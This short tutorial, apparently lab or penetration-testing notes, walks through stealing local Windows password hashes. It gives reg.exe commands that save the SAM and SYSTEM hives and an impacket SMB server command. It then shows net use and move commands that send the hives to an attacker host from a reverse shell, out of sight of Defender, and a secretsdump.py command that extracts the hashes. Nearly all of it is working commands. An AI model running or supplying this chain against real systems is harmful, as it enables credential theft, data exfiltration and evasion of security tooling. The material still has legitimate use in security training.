Local user hashes are stored in the Windows Registry whilst the computer is running -- specically in the `HKEY_LOCAL_MACHINE\SAM` hive. This can also be found as a file at `C:\Windows\System32\Config\SAM`, however, this should not be readable whilst the computer is running. To dump the hashes locally, we first need to save the SAM hive:  
`reg.exe save HKLM\SAM sam.bak  
`

This saves the hive as a file called "sam.bak" in the current directory.

Dumping the SAM hive isn't quite enough though -- we also need the SYSTEM hive which contains the boot key for the machine:  
`reg.exe save HKLM\SYSTEM system.bak`

---

With both Hives dumped, we can exfiltrate them back to our attacking machine to dump the hashes out of sight of Defender.

It's up to you how you choose to exfiltrate the files.  We can use impacket smb server

`sudo python3 /opt/impacket/examples/smbserver.py share . -smb2support -username user -password s3cureP@ssword`

Now, in our reverse shell, we can use this command to authenticate:  
`net use \\ATTACKER_IP\share /USER:user s3cureP@ssword`

`move sam.bak \\ATTACKING_IP\share\sam.bak`

---

Once we have the .bak files back on our machine, we can use secretsdump.py

`python3 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL`